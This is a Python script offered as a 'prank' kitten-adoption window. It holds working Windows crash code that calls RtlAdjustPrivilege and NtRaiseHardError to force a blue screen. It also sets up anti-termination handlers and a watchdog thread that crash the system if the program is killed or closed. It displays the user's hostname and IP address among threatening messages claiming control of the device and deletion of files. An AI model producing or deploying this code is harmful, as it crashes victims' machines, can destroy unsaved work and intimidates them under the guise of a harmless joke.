import importlib
import subprocess
import sys
import signal
import threading

def installdep():
    standard_modules = ['os', 'socket', 'sys', 'time', 'threading', 'ctypes', 'signal']
    required_packages = ['tkinter', 'watchdog']
    
    for module in standard_modules:
        try:
            importlib.import_module(module)
            print(f"{module} is already available (standard library).")
        except ImportError:
            print(f"ERROR: Standard library module {module} not found!")
    
    for package in required_packages:
        try:
            importlib.import_module(package)
            print(f"{package} is already installed.")
        except ImportError:
            print(f"{package} not found. Installing...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(f"{package} has been installed successfully.")
            except subprocess.CalledProcessError:
                print(f"Failed to install {package}. Please install it manually.")
                sys.exit(1)

installdep()
from tkinter import *
from tkinter import ttk
from tkinter import messagebox
import os
import socket
import sys
import time
import threading
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
def puppy():
    nullptr = POINTER(c_int)()
    
    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )
def setup_kill_protection():
    def handle_kill_signal(signum, frame):
        puppy()
    signal.signal(signal.SIGTERM, handle_kill_signal)
    signal.signal(signal.SIGINT, handle_kill_signal)
    signal.signal(signal.SIGABRT, handle_kill_signal)
    def watchdog():
        main_thread = threading.main_thread()
        while True:
            time.sleep(0.5)
            if not main_thread.is_alive():
                puppy()
    watchdog_thread = threading.Thread(target=watchdog, daemon=True)
    watchdog_thread.start()
setup_kill_protection()
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
root = Tk()
frm = ttk.Frame(root, padding=100)
frm.grid()
ttk.Label(frm, text="  ╱|、").grid(column=0, row=0)
ttk.Label(frm, text="(˚ˎ 。7").grid(column=0, row=1)
ttk.Label(frm, text="|、˜〵").grid(column=0, row=2)
ttk.Label(frm, text=" じしˍ,)ノ").grid(column=0, row=3)
ttk.Label(frm, text="Dɪsᴄʟᴀɪᴍᴇʀ: ᴡᴇ ᴅᴏɴ'ᴛ ʟᴏɡ ᴛʜɪs ɪɴғᴏ ᴛʜɪs ɪs ᴊᴜsᴛ ᴀ ᴘʀᴀɴᴋ").grid(column=0, row=5)
def kill_prompt():
   messagebox.showinfo("Message", "How dare you")
   messagebox.showinfo("Message", "why would you ever do this")
   messagebox.showinfo("Message", "You know what will happen now")
   messagebox.showinfo("Message", "Do you know what youve gotten yourself into")
   messagebox.showinfo("Message", "I have the controls to your device")
   messagebox.showinfo("Message", "ᎩᎧᏬᏒ ᏖᏒᏗᎮᎮᏋᎴ ᏂᏋᏒᏋ ᏇᎥᏖᏂ ᎷᏋ ᏁᎧᏇ")
   messagebox.showinfo("Message", "H҉A҉ ҉H҉A҉ ҉H҉A҉ ҉H҉A҉ ҉H҉A҉ ҉H҉A҉")
   messagebox.showinfo("Message", "Your OS Name is:" + hostname)
   messagebox.showinfo("Message", "Your IP address:" + IPAddr)
   messagebox.showinfo("Message", "All your files will be gone now")
   messagebox.showinfo("Message", "So now")
   messagebox.showinfo("Message", "/ᐠ - ˕ -マ may he rest in peace")
   messagebox.showinfo("Message", "And you, you will die for this /ᐠﹷ ‸ ﹷ ᐟ\ﾉ")
   messagebox.showinfo("Message", "Pwease Dont Weave Me")
   puppy()
def leave_prompt():
    messagebox.showinfo("Message", "You truly disgust me")
    messagebox.showinfo("Message", "I don't get why you wouldnt help him")
    messagebox.showinfo("Message", "Just look at him")
    messagebox.showinfo("Message", "/ᐠ - ˕ -マ like seriosly")
    messagebox.showinfo("Message", "whatever man ig you do you")
def adopt_prompt():
    messagebox.showinfo("Message", "Yippe you took him in ฅᨐฅ₎")
    root.destroy()
ttk.Button(frm, text= "Put him down", command= kill_prompt).grid(column=0, row=7)
ttk.Button(frm, text= "Leave", command= leave_prompt).grid(column=0, row=9)
ttk.Button(frm, text= "Adopt", command= adopt_prompt).grid(column=0, row=11)
def on_closing():
    if messagebox.askokcancel("Quit", "Why would you want to leave the kitten - ˕ •マ "):
        messagebox.showinfo("Quit", "You will pay the price for this")
        messagebox.showinfo("Quit", "₍^.  ̫.^₎ just look at him")
        messagebox.showinfo("Quit", "Your now my opp kid")
        messagebox.showinfo("Quit", "I will find you someday ₍^ >ヮ<^₎ .ᐟ.ᐟ")
        root.destroy()
root.protocol("WM_DELETE_WINDOW", on_closing)
root.mainloop()
